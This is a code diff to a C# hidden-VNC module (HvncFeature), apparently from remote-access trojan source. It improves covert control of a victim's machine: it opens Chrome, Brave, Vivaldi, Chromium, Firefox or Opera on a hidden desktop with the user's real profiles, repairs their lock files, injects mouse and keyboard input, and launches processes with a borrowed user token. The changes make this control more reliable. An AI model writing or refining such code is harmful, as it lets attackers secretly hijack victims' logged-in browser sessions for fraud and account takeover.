@@ -279,6 +279,7 @@ internal static class HvncFeature
     private static nint _hDesktop;
     private static nint _gdipToken;
     private static volatile bool _running;
+    private static int           _stopping; // Interlocked guard — Stop() must not double-free GDI handles
     private static Thread? _captureThread;
     private static Func<int, string, System.Threading.Tasks.Task>? _send;
     private static readonly SemaphoreSlim _ackWake = new(0);
@@ -319,10 +320,13 @@ internal static class HvncFeature
     private static int  _moveOffX, _moveOffY, _moveSizeW, _moveSizeH;
     private static nint _captionFwdHwnd; // hwnd that received WM_LBUTTONDOWN on HTCAPTION mousedown (needs matching WM_LBUTTONUP)
     private static nint _lbDownHwnd;     // hwnd that received the last WM_LBUTTONDOWN — UP must go to the same widget
-    private static bool _leftButtonDown; // true while LButton is held — WM_MOUSEMOVE wParam must carry MK_LBUTTON or Qt synthesizes a fake release
+    private static bool _leftButtonDown;  // true while LButton is held — WM_MOUSEMOVE wParam must carry MK_LBUTTON or Qt synthesizes a fake release
+    private static bool _rightButtonDown;
+    private static bool _middleButtonDown;
     private static long _lastLeftMs;
     private static int  _lastClickX, _lastClickY;
     private static bool _loggedUiaChain; // log UIItemsView parent chain once
+    private static readonly HashSet<int> _charKeyDown = new(); // VKs sent as WM_CHAR (no WM_KEYDOWN) — suppress their WM_KEYUP
 
     // Single-instance tracking: maps exe basename → PID we launched on hidden desktop
     private static readonly ConcurrentDictionary<string, uint> _launchedPids = new();
@@ -416,6 +420,12 @@ internal static class HvncFeature
 
     public static void Stop()
     {
+        if (Interlocked.Exchange(ref _stopping, 1) != 0) return; // prevent concurrent double-free
+        try { StopCore(); } finally { Interlocked.Exchange(ref _stopping, 0); }
+    }
+
+    private static void StopCore()
+    {
         _running = false;
         _ackWake.Release();
         while (_inputQueue.TryDequeue(out _)) { }
@@ -452,6 +462,9 @@ internal static class HvncFeature
         _captionFwdHwnd  = 0;
         _lbDownHwnd      = 0;
         _leftButtonDown  = false;
+        _rightButtonDown = false;
+        _middleButtonDown = false;
+        _charKeyDown.Clear();
         _lastHwnd        = 0;
         _lastLeftMs      = 0;
         _lastClickX      = _lastClickY = 0;
@@ -500,7 +513,7 @@ internal static class HvncFeature
         if (launchedChrome)   { CleanRealBrowserLock("Google",       "Chrome",          "User Data"); RepairChromiumRealProfile("Google",       "Chrome",          "User Data"); }
         if (launchedBrave)    { CleanRealBrowserLock("BraveSoftware","Brave-Browser",   "User Data"); RepairChromiumRealProfile("BraveSoftware","Brave-Browser",   "User Data"); }
         if (launchedVivaldi)  { CleanRealBrowserLock("Vivaldi",                         "User Data"); RepairChromiumRealProfile("Vivaldi",                         "User Data"); }
-        if (launchedChromium) CleanRealBrowserLock("Chromium",                        "User Data");
+        if (launchedChromium) { CleanRealBrowserLock("Chromium", "User Data"); RepairChromiumRealProfile("Chromium", "User Data"); }
         if (launchedFirefox)  CleanFirefoxRealLocks();
     }
 
@@ -911,7 +924,7 @@ internal static class HvncFeature
                 {
                     uint cbRead = 0;
                     _vtRead(stream, (nint)pResult, (uint)size, out cbRead);
-                    if (cbRead == 0) return null;
+                    if (cbRead != (uint)size) return null; // partial or empty read → invalid JPEG
                 }
                 return result;
             }
@@ -1053,9 +1066,10 @@ internal static class HvncFeature
         ActivateIfNewWindow(hwnd);
         var cPt = pt;
         ScreenToClient(hwnd, ref cPt);
-        // Pass MK_LBUTTON when LButton is held — Qt/Electron will synthesize a fake
-        // MouseButtonRelease if wParam=0 arrives while they believe LButton is pressed.
-        nint moveWParam = _leftButtonDown ? (nint)MK_LBUTTON : 0;
+        // Carry all held button flags — Qt/Electron synthesize fake releases if a held button is absent
+        nint moveWParam = (_leftButtonDown  ? (nint)MK_LBUTTON : 0)
+                        | (_rightButtonDown  ? (nint)MK_RBUTTON : 0)
+                        | (_middleButtonDown ? (nint)MK_MBUTTON : 0);
         PostMessage(hwnd, WM_MOUSEMOVE, moveWParam, MakeLParam(cPt.x, cPt.y));
     }
 
@@ -1231,18 +1245,25 @@ internal static class HvncFeature
                         // is established in the correct widget before mousePressEvent fires.
                         if (isQt)
                             SendMessageTimeout(hwnd, WM_MOUSEMOVE, 0, lParam, SMTO_ABORTIFHUNG, 50, out _);
-                        SendMessageTimeout(hwnd, WM_LBUTTONDOWN, (nint)MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, out _);
                         _lbDownHwnd = hwnd;
-                        if (isDbl && origIsUia)
+                        if (isDbl)
                         {
-                            SendMessageTimeout(hwnd, WM_LBUTTONDBLCLK, (nint)MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, out _);
-                            uint scanRet = MapVirtualKey(0x0D, 0);
-                            PostMessage(root, WM_KEYDOWN, 0x0D, (nint)(1u | (scanRet << 16)));
-                            PostMessage(root, WM_KEYUP,   0x0D, unchecked((nint)(0xC0000001u | (scanRet << 16))));
+                            // WM_LBUTTONDBLCLK replaces WM_LBUTTONDOWN on the 2nd click — sending both is spurious
+                            if (origIsUia)
+                            {
+                                SendMessageTimeout(hwnd, WM_LBUTTONDBLCLK, (nint)MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, out _);
+                                uint scanRet = MapVirtualKey(0x0D, 0);
+                                PostMessage(root, WM_KEYDOWN, 0x0D, (nint)(1u | (scanRet << 16)));
+                                PostMessage(root, WM_KEYUP,   0x0D, unchecked((nint)(0xC0000001u | (scanRet << 16))));
+                            }
+                            else
+                            {
+                                SendMessageTimeout(hwnd, WM_LBUTTONDBLCLK, (nint)MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, out _);
+                            }
                         }
-                        else if (isDbl)
+                        else
                         {
-                            SendMessageTimeout(hwnd, WM_LBUTTONDBLCLK, (nint)MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, out _);
+                            SendMessageTimeout(hwnd, WM_LBUTTONDOWN, (nint)MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, out _);
                         }
                     }
                     else
@@ -1250,10 +1271,12 @@ internal static class HvncFeature
                         // WM_MOUSEMOVE first: Qt and Electron apps track hover state and
                         // won't fire click handlers if the cursor "appears" without moving there.
                         PostMessage(hwnd, WM_MOUSEMOVE, 0, lParam);
-                        PostMessage(hwnd, WM_LBUTTONDOWN, (nint)MK_LBUTTON, lParam);
                         _lbDownHwnd = hwnd;
                         if (isDbl)
+                            // WM_LBUTTONDBLCLK replaces WM_LBUTTONDOWN on the 2nd click — sending both produces a spurious extra DOWN
                             PostMessage(hwnd, WM_LBUTTONDBLCLK, (nint)MK_LBUTTON, lParam);
+                        else
+                            PostMessage(hwnd, WM_LBUTTONDOWN, (nint)MK_LBUTTON, lParam);
                     }
                 }
                 else
@@ -1288,14 +1311,20 @@ internal static class HvncFeature
                 // Send only WM_RBUTTONDOWN/WM_RBUTTONUP — the window's DefWindowProc generates
                 // WM_CONTEXTMENU from WM_RBUTTONUP automatically. Posting it explicitly caused
                 // two menus to open, the second instantly dismissing the first.
-                uint rmkeys = (_leftButtonDown ? MK_LBUTTON : 0u) | (_shiftDown ? 0x0004u : 0u) | (_ctrlDown ? 0x0008u : 0u);
+                _rightButtonDown = down;
+                uint rmkeys = (_leftButtonDown   ? MK_LBUTTON : 0u)
+                            | (_middleButtonDown  ? MK_MBUTTON : 0u)
+                            | (_shiftDown ? 0x0004u : 0u) | (_ctrlDown ? 0x0008u : 0u);
                 PostMessage(hwnd, down ? WM_RBUTTONDOWN : WM_RBUTTONUP,
                             down ? (nint)(MK_RBUTTON | rmkeys) : (nint)rmkeys, lParam);
                 break;
             }
             default: // Middle — server sends button=2
             {
-                uint mmkeys = (_leftButtonDown ? MK_LBUTTON : 0u) | (_shiftDown ? 0x0004u : 0u) | (_ctrlDown ? 0x0008u : 0u);
+                _middleButtonDown = down;
+                uint mmkeys = (_leftButtonDown  ? MK_LBUTTON : 0u)
+                            | (_rightButtonDown  ? MK_RBUTTON : 0u)
+                            | (_shiftDown ? 0x0004u : 0u) | (_ctrlDown ? 0x0008u : 0u);
                 PostMessage(hwnd, down ? WM_MBUTTONDOWN : WM_MBUTTONUP,
                             down ? (nint)(MK_MBUTTON | mmkeys) : (nint)mmkeys, lParam);
                 break;
@@ -1392,16 +1421,21 @@ internal static class HvncFeature
         }
 
         // Printable key without Ctrl/Alt: WM_CHAR with correctly shifted/capped character.
+        // No WM_KEYDOWN is sent — record the VK so we can suppress the matching WM_KEYUP.
         if (down && !IsNonPrintableVK(vk) && !_ctrlDown && !_altDown)
         {
             string? chars = VkToChars(vk);
             if (chars != null && chars.Length > 0)
             {
+                _charKeyDown.Add(vk);
                 foreach (char ch in chars)
                     PostMessage(hwnd, WM_CHAR, (nint)ch, 1);
                 return;
             }
         }
+
+        // Suppress WM_KEYUP for keys whose press was sent as WM_CHAR (no matching WM_KEYDOWN was sent)
+        if (!down && _charKeyDown.Remove(vk)) return;
 
         // All other keys: WM_KEYDOWN/WM_KEYUP (Delete, Enter, arrows, non-letter Ctrl combos…)
         PostMessage(hwnd, down ? WM_KEYDOWN : WM_KEYUP, (nint)vk, down ? lpDn : lpUp);
@@ -2453,31 +2487,37 @@ internal static class HvncFeature
             uint createFlags = CREATE_UNICODE_ENVIRONMENT | (isConsoleApp ? CREATE_NEW_CONSOLE : 0u);
             nint launchToken = GetLaunchToken();
             nint envBlock = 0;
-            if (launchToken != 0) CreateEnvironmentBlock(out envBlock, launchToken, false);
             PROCESS_INFORMATION pi = default;
-            if (launchToken != 0)
+            try
             {
-                if (!CreateProcessWithTokenW(launchToken, 0, 0, sb, createFlags, envBlock, 0, ref si, out pi) || pi.dwProcessId == 0)
+                if (launchToken != 0) CreateEnvironmentBlock(out envBlock, launchToken, false);
+                if (launchToken != 0)
                 {
-                    // Close any handles the failed variant may have written before cascading.
-                    if (pi.hProcess != 0) { CloseHandle(pi.hProcess); }
-                    if (pi.hThread  != 0) { CloseHandle(pi.hThread);  }
-                    pi = default;
-                    if (!CreateProcessAsUserW(launchToken, 0, sb, 0, 0, false, createFlags, envBlock, 0, ref si, out pi) || pi.dwProcessId == 0)
+                    if (!CreateProcessWithTokenW(launchToken, 0, 0, sb, createFlags, envBlock, 0, ref si, out pi) || pi.dwProcessId == 0)
                     {
+                        // Close any handles the failed variant may have written before cascading.
                         if (pi.hProcess != 0) { CloseHandle(pi.hProcess); }
                         if (pi.hThread  != 0) { CloseHandle(pi.hThread);  }
                         pi = default;
-                        CreateProcessW(0, sb, 0, 0, false, createFlags, 0, 0, ref si, out pi);
+                        if (!CreateProcessAsUserW(launchToken, 0, sb, 0, 0, false, createFlags, envBlock, 0, ref si, out pi) || pi.dwProcessId == 0)
+                        {
+                            if (pi.hProcess != 0) { CloseHandle(pi.hProcess); }
+                            if (pi.hThread  != 0) { CloseHandle(pi.hThread);  }
+                            pi = default;
+                            CreateProcessW(0, sb, 0, 0, false, createFlags, 0, 0, ref si, out pi);
+                        }
                     }
                 }
+                else
+                {
+                    CreateProcessW(0, sb, 0, 0, false, createFlags, 0, 0, ref si, out pi);
+                }
             }
-            else
+            finally
             {
-                CreateProcessW(0, sb, 0, 0, false, createFlags, 0, 0, ref si, out pi);
+                if (envBlock    != 0) DestroyEnvironmentBlock(envBlock);
+                if (launchToken != 0) CloseHandle(launchToken);
             }
-            if (envBlock    != 0) DestroyEnvironmentBlock(envBlock);
-            if (launchToken != 0) CloseHandle(launchToken);
             StubLog.Info($"[HVNC] LaunchOnDesktop '{path}' pid={pi.dwProcessId}");
             if (pi.dwProcessId != 0) _launchedPids[pidKey] = pi.dwProcessId;
             if (pi.dwProcessId != 0 && exeBase == "opera.exe")    PatchCursorInfoAsync(pi.dwProcessId);
